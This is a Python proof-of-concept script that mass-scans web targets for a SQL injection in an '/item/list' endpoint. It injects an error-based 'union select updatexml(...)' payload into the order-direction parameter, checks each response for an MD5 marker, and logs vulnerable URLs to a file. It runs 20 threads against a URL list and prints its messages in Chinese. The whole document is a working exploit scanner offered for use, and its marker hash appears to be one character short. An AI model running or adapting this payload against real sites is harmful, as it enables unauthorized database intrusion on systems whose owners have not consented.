import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7",
    "Connection": "close",
    }   
def poc(url):
    payload = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,MD5(1),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    target = url+payload
    try:
        rsp = requests.get(url=target,verify=False)
        if rsp.status_code == 200:
            if 'c4ca4238a0b923820dcc509a6f75849' in rsp.text:
                print(f"[+]{url}存在sql注入")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
        else:
            print(f"[-]{url}不存在sql注入")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()